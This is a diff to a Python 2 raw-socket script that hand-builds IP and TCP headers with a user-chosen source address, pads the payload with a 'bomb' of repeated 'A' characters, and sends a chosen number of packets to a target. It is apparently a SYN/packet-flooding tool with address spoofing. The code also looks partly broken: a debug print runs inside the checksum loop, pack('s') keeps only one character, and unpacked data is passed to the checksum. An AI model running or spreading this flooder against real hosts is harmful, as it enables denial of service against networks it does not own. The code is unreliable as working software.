@@ -1,25 +1,25 @@
 #!/usr/bin/python
 
-import socket, sys, time, argparse, random
-import subprocess
+import socket, sys, time, argparse, random, os
 from struct import *
 
 # checksum functions needed for calculation checksum
 def checksum(msg):
-	s = 0
-	
-	# loop taking 2 characters at a time
-	for i in range(0, len(msg), 2):
-		w = ord(msg[i]) + (ord(msg[i+1]) << 8 )
-		s = s + w
-	
-	s = (s>>16) + (s & 0xffff);
-	s = s + (s >> 16);
-	
-	#complement and mask to 4 byte short
-	s = ~s & 0xffff
-	
-	return s
+    s = 0
+    # loop taking 2 characters at a time
+    for i in range(0, len(msg), 2):
+        print(i)
+        if i+1 < len(msg):
+            w = ord(msg[i]) + (ord(msg[i+1]) << 8 )
+            s = s + w
+
+    s = (s>>16) + (s & 0xffff);
+    s = s + (s >> 16);
+
+    #complement and mask to 4 byte short
+    s = ~s & 0xffff
+
+    return s
 
 def build_ip_header(source, destination):
     # ip header fields
@@ -42,7 +42,7 @@ def build_ip_header(source, destination):
     
     return ip_header
 
-def build_tcp_header(dport):
+def build_tcp(src_ip, dest_ip, dport, packed_user_data):
     # tcp header fields
     tcp_source = random.randint(1025,65535)	# source port
     tcp_dest = dport	# destination port
@@ -66,6 +66,28 @@ def build_tcp_header(dport):
     # the ! in the pack format string means network order
     tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)
 
+    tcp_length = len(tcp_header) + len(packed_user_data)
+
+    # pseudo header fields
+    source_address = socket.inet_aton(src_ip)
+    dest_address = socket.inet_aton(dest_ip)
+    placeholder = 0
+    protocol = socket.IPPROTO_TCP
+
+    try:
+        psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length)
+    except:
+        psh = pack('!4s4sBBQ', source_address, dest_address, placeholder, protocol, tcp_length)
+    psh = psh + tcp_header + packed_user_data
+
+    # calculate checksum
+    tcp_check = checksum(psh)
+    
+    # make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
+    tcp_header = pack('!HHLLBBH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + pack('H' , tcp_check) + pack('!H' , tcp_urg_ptr)
+
+    return tcp_header
+
 
 # the main function
 def main():
@@ -88,22 +110,12 @@ def main():
 
     # tell kernel not to put in headers, since we are providing it, when using IPPROTO_RAW this is not necessary
     # s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        
-    # now start constructing the packet
-    packet = ''
 
-    src_ip = args.source
-    dest_ip = args.destination
-    dport = args.port
-
-    ip_header = build_ip_header(src_ip, dest_ip)
-    tcp_header = build_tcp_header(dport)
-    
-    ## can send huge amounts of data here
+    ## Data to send: can send huge amounts of data here
     send_bomb = int(args.bomb)
     if send_bomb != 0:
         #bashCommand = "python -c 'print \"A\"*40000000' > bomb.txt"
-        subprocess.run(["python", "-c", "'print \"A\"*40000000", ">", "bomb.txt"])
+        os.system("python -c 'print \"A\"*4000' > bomb.txt")
         try:
             with open("bomb.txt") as f:
                 user_data = f.read()
@@ -114,30 +126,23 @@ def main():
 
     packed_user_data = pack("s", user_data)
 
-    # pseudo header fields
-    source_address = socket.inet_aton(src_ip)
-    dest_address = socket.inet_aton(dest_ip)
-    placeholder = 0
-    protocol = socket.IPPROTO_TCP
-    tcp_length = len(tcp_header) + len(packed_user_data)
+    # Amount of packets to send
+    count = int(args.count)
+        
+    ## Start constructing the packet
+    packet = ''
 
-    try:
-        psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length)
-    except:
-        psh = pack('!4s4sBBQ', source_address, dest_address, placeholder, protocol, tcp_length)
-    psh = psh + tcp_header + packed_user_data
+    src_ip = args.source
+    dest_ip = args.destination
+    dport = int(args.port)
 
-    tcp_check = checksum(psh)
-    #print tcp_checksum
-
-    # make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
-    tcp_header = pack('!HHLLBBH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + pack('H' , tcp_check) + pack('!H' , tcp_urg_ptr)
-
+    ip_header = build_ip_header(src_ip, dest_ip)
+    tcp_header = build_tcp(src_ip, dest_ip, dport, user_data)
+    
     # final full packet - syn packets dont have any data
     packet = ip_header + tcp_header + packed_user_data
     
-    # increase count to send more packets
-    count = int(args.count)
+    
     
     for i in range(count):
         print 'sending packet...'
@@ -147,4 +152,7 @@ def main():
         
     print 'all packets send';
 
-main()
+
+
+if __name__ == "__main__":
+    main()
